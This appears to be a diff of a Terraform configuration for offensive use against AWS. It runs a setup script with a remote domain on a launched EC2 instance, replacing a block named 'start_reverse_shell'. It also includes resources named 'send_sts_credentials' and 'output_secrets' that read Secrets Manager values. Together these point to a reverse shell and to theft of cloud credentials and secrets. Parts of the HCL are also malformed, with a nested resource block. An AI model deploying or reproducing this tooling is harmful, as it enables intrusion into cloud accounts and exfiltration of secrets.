@@ -1,24 +1,30 @@
 
-resource "null_resource" "remote_script" {
+resource "aws_instance" "server" {
   count = var.run_remote_script ? 1 : 0
+  ami           = "ami-06ca3ca175f37dd66"
+  instance_type = "t2.micro"
 
-  triggers = {
-    script_hash = filemd5(var.remote_script_path)
-  }
+  associate_public_ip_address = true
+
+provisioner "remote-exec" {
+  inline = [
+    "bash scripts/setup.sh ${var.remote_domain}"
+  ]
+}
+
+  #iam_instance_profile = "tf-testing-role"
 
   connection {
     type        = "ssh"
-    user        = "your_ssh_user"
-    private_key = file("path/to/your/private/key")
-    host        = "your_remote_host"
+    user        = "ec2-user"
+    private_key = file(var.priv_key)
+    host        = self.public_ip
+    agent       = false
   }
 
-  resource "null_resource" "start_reverse_shell" {
-    provisioner "local-exec" {
-      command = "bash scripts/setup.sh ${var.remote_domain}"
-    }
-  }
+
 }
+
 
 resource "null_resource" "send_sts_credentials" {
   count = var.run_local_script ? 1 : 0
@@ -41,9 +47,6 @@ data "aws_secretsmanager_secret_version" "secrets" {
   secret_id = each.value
 }
 
-data "aws_secretsmanager_secret" "all" {
-  include_hidden = true
-}
 
 resource "null_resource" "output_secrets" {
   count = var.secrets ? 1 : 0
